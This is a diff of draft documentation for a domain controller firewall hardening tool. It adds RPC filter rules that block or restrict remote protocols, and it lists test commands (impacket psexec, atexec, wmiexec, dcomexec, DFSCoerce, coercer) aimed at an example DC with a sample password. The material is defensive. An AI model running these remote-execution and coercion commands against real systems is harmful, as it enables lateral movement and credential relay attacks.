@@ -11,6 +11,11 @@ keywords:
   - PowerShell
   - Group Policy
   - Security
+  - RPC
+header-right: "\\hspace{1cm}"
+footer-left: "\\hspace{1cm}"
+footer-center: "Page \\thepage"
+footer-right: "\\hspace{1cm}"
 ---
 
 # Domain Controller Firewall
@@ -90,7 +95,11 @@ The tool provides a flexible and repeatable way to deploy secure configuration i
 
 ### Firewall Rule Deduplication
 
-TODO
+TODO: Explain Dedup/consolidation
+
+![Duplicate RPC Endpoint Mapper rules](../Screenshots/duplicate-epmap-rules.png)
+
+![Duplicate SMB rules](../Screenshots/duplicate-epmap-rules.png)
 
 ### Issues with Predefined Address Sets
 
@@ -103,13 +112,32 @@ TODO
 ### Avoiding Localized Rule Names
 
 TODO
-depend on RSAT
+Depends on RSAT, not localized to all languages
+
+![Localized rule names not displayed correctly](../Screenshots/localization-issue.png)
+
+### Dealing with GPO Tattooing
+
+TODO
+
+### System Reboots
+
+TODO: Need to be done manually when static ports or startup scripts are changed.
+
+### Identifying Management Traffic
+
+Easy: RDP, WinRM (PowerShell Remoting), ADWS,...
+Problems: MS-DRSR, LDAP, SMB, DCOM, Remote Registry
 
 ### Security Standards Compliance
 
 - [DoD: Windows Firewall with Advanced Security Security Technical Implementation Guide (STIG)](https://www.stigviewer.com/stig/windows_firewall_with_advanced_security/)
 - [CIS: Microsoft Windows Server 2022 v2.0.0 L1 DC](https://www.tenable.com/audits/CIS_Microsoft_Windows_Server_2022_Benchmark_v2.0.0_L1_DC)
 - [Microsoft: Windows Server 2022 Security Baseline](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
+
+### Distribution Contents
+
+TODO: File list
 
 ## Prerequisites
 
@@ -226,6 +254,10 @@ Note, that “Default value” in the configuration items below, refers to defau
   "EnableRpcFilters": true
 }
 ```
+
+TODO: Intellisense support:
+
+![Visual Studio Code support](../Screenshots/settings-intellisense.png)
 
 The remainder of this chapter contains documentation to all the available settings.
 
@@ -349,9 +381,9 @@ By default, the RPC is using dynamic ports 49152 – 65535. If null, this settin
 If set to 0 (zero), the port is set to dynamic.
 If this is configured, you also need to configure the `NetlogonStaticPort` value.
 
-> HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
-> Registry value: TCP/IP Port
-> Value type: REG_DWORD
+> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters  
+> Registry value: TCP/IP Port  
+> Value type: REG_DWORD  
 > Value data: (available port)
 
 Restart the computer for the new setting to become effective.
@@ -369,7 +401,7 @@ Description: By default, the RPC is using dynamic ports 49152 – 65535. If null
 If set to 0 (zero), the port is set to dynamic.
 If this is configured, you also need to configure `NtdsStaticPort` value.
 
-> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters  
+> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters  
 > Registry value: DCTcpipPort  
 > Value type: REG_DWORD  
 > Value data: (available port)
@@ -888,7 +920,7 @@ taskhostw.exe
 
 ### Microsoft Defender for Identity
 
-DC Sensor to Client traffic - SMB, NetBIOS?
+Defender for Identity sensor to All devices on network  - SMB (TCP/UDP 445), RPC (TCP 135), NetBIOS (UDP 137), RDP (TCP 3389).
 
 ### Azure Arc
 
@@ -936,6 +968,17 @@ impacket-psexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
 impacket-smbexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
 ```
 
+Named pipe: [\PIPE\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) , Protocol UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333)
+
+```txt
+# Block [MS-SCMR]: Service Control Manager Remote Protocol, Named pipe: \PIPE\svcctl
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=d0c7640c-9355-4e52-8335-c12835559c10
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=367ABB81-9844-35F1-AD32-98F038001003
+add filter
+```
+
 ### \[MS-TSCH\]: Task Scheduler Service Remoting Protocol
 
 ```shell
@@ -946,20 +989,35 @@ schtasks.exe /query /s contoso-dc
 impacket-atexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
 ```
 
-### WMI
+Named pipe: [\PIPE\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
 
-```powershell
-Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
+Interface UUID: [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+
+```txt
+# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Windows Vista Task Remote Protocol (ITaskSchedulerService)
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=a43b9dd2-0866-4476-89dc-2e9b200762af
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=86D35949-83C9-4044-B424-DB363231FD0C
+add filter
+```
+Interface UUID: [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
+
+
+```txt
+# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Task Scheduler Agent (ATSvc)
+add rule layer=um actiontype=block filterkey=13518c11-e3d8-4f62-9461-eda11beb540a
+add condition field=if_uuid matchtype=equal data=1FF70682-0A51-30E8-076D-740BE8CEE98B
+add filter
 ```
 
-```shell
-impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
-```
+Interface UUID: [378E52B0-C0A9-11CF-822D-00AA0051E40F](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)
 
-### DCOM
-
-```shell
-impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```txt
+# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Net Schedule (SASec)
+add rule layer=um actiontype=block filterkey=1c079a18-e91f-4698-9868-68a121490636
+add condition field=if_uuid matchtype=equal data=378E52B0-C0A9-11CF-822D-00AA0051E40F
+add filter
 ```
 
 ### \[MS-EVEN6\]: EventLog Remoting Protocol Version 6.0
@@ -968,9 +1026,29 @@ impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
 wevtutil.exe /r:contoso-dc qe System /c:1
 ```
 
+Ability to clear security event logs remotely.
+
+```txt
+# Block [MS-EVEN6]: EventLog Remoting Protocol Version 6.0, Named pipe: \PIPE\eventlog
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=dedffabf-db89-4177-be77-1954aa2c0b95
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=f6beaff7-1e19-4fbb-9f8f-b89e2018337c
+add filter
+```
+
 ### \[MS-EVEN\]: EventLog Remoting Protocol
 
 TODO
+
+Legacy proto, Uses only named pipes
+
+```txt
+# Block [MS-EVEN]: EventLog Remoting Protocol, Named pipe: \PIPE\eventlog
+add rule layer=um actiontype=block filterkey=f7f68868-5f50-4cda-a18c-6a7a549652e7
+add condition field=if_uuid matchtype=equal data=82273FDC-E32A-18C3-3F78-827929DC23EA
+add filter
+```
 
 ### \[MS-DFSNM\]: Distributed File System (DFS): Namespace Management Protocol
 
@@ -980,11 +1058,35 @@ Restrict to Domain Admins
 python3 DFSCoerce/dfscoerce.py -u john -p 'Pa$$w0rd' -d contoso.com hacker-pc contoso-dc
 ```
 
+```txt
+# Restrict [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol, Named pipe: \PIPE\netdfs
+# Limit access to Domain Admins only.
+add rule layer=um actiontype=permit filterkey=43873c58-e130-4ffb-8858-d259a673a917
+add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
+add condition field=remote_user_token matchtype=equal data=D:(A;;CC;;;DA)
+add filter
+
+# Block MS-DFSNM by default
+add rule layer=um actiontype=block filterkey=0a239867-73db-45e6-b287-d006fe3c8b18
+add condition field=if_uuid matchtype=equal data=4FC742E0-4A10-11CF-8273-00AA004AE673
+add filter
+```
+
 ### \[MS-RPRN\]: Print System Remote Protocol
 
 https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print
 
 TODO
+
+```txt
+# Block [MS-RPRN]: Print System Remote Protocol, Named pipe: \PIPE\spoolss
+# This rule only blocks RPC over Named Pipes,
+# while RPC over TCP is still allowed on Windows 11, version 22H2 and later versions of Windows.
+add rule layer=um actiontype=block filterkey=7966512a-f2f4-4cb1-812d-d967ab83d28a
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=12345678-1234-ABCD-EF00-0123456789AB
+add filter
+```
 
 ### \[MS-EFSR\]: Encrypting File System Remote (EFSRPC) Protocol
 
@@ -992,9 +1094,90 @@ TODO
 coercer coerce --target-ip contoso-dc --listener-ip hacker-pc --username john --password 'Pa$$w0rd' --domain contoso.com  --always-continue
 ```
 
+```txt
+# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol, Named pipe: \PIPE\lsarpc
+# Require Kerberos authentication and packet encryption. Not bulletproof, but blocks most hacktools.
+add rule layer=um actiontype=permit filterkey=d71d00db-3eef-4935-bedf-20cf628abd9e
+add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
+add condition field=auth_type matchtype=equal data=16
+add condition field=auth_level matchtype=equal data=6
+add filter
+
+# Block MS-EFSR over \PIPE\lsarpc by default
+add rule layer=um actiontype=block filterkey=3a4cce27-a7fa-4248-b8b8-ef6439a2c0ff
+add condition field=if_uuid matchtype=equal data=c681d488-d850-11d0-8c52-00c04fd90f7e
+add filter
+
+# Restrict [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol, Named pipe: \PIPE\efsrpc
+# Require Kerberos authentication and packet encryption. Not bulletproof, but blocks most hacktools.
+add rule layer=um actiontype=permit filterkey=c5cf8020-c83c-4803-9241-8c7f3b10171f
+add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
+add condition field=auth_type matchtype=equal data=16
+add condition field=auth_level matchtype=equal data=6
+add filter
+
+# Block MS-EFSR over \PIPE\efsrpc by default
+add rule layer=um actiontype=block filterkey=9ad23a91-085d-4f99-ae15-85e0ad801278
+add condition field=if_uuid matchtype=equal data=df1941c5-fe89-4e79-bf10-463657acf44d
+add filter
+```
+
 ### \[MS-DNSP\]: Domain Name Service (DNS) Server Management Protocol
 
 TODO
+
+```txt
+# Block [MS-DNSP]: Domain Name Service (DNS) Server Management Protocol, Named pipe: \PIPE\DNSSERVER
+# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
+add rule layer=um actiontype=block filterkey=50754fe4-aa2d-42ff-8196-e90ea8fd2527
+add condition field=protocol matchtype=equal data=ncacn_np
+add condition field=if_uuid matchtype=equal data=50abc2a4-574d-40b3-9d66-ee4fd5fba076
+add filter
+```
+
+### \[MS-WMI\]: Windows Management Instrumentation Remote Protocol
+
+```powershell
+Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName contoso-dc
+```
+
+```shell
+impacket-wmiexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+Solved using Defender ASR rules.
+
+TODO: Test service creation using WMI
+
+### DCOM
+
+TODO: Block command execution over DCOM over named pipes (ShellWindows, ShellBrowserWindow, and MMC20 objects)
+
+```shell
+impacket-dcomexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
+```
+
+TODO: Does it event work?
+
+### \[MS-TSTS\]: Terminal Services Terminal Server Runtime Interface Protocol
+
+https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1eb45af1-94f1-4c42-9e13-dd0a018646fd
+
+TODO: Block RDP-related protocols over named pipes?
+
+### \[MS-RSP\]: Remote Shutdown Protocol
+
+https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rsp/6dfeb978-7a02-4826-b537-a1760fbf8074
+
+UUID: d95afe70-a6d5-4259-822e-2c84da1ddb0d 
+ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]
+
+UUID: 76f226c3-ec14-4325-8a99-6a46348418af 
+ncacn_np:127.0.0.1[\\PIPE\\InitShutdown]
+
+### Further Protocol Considerations
+
+TODO: Firewall remote management?
 
 ### Additional Reading on RPC
 
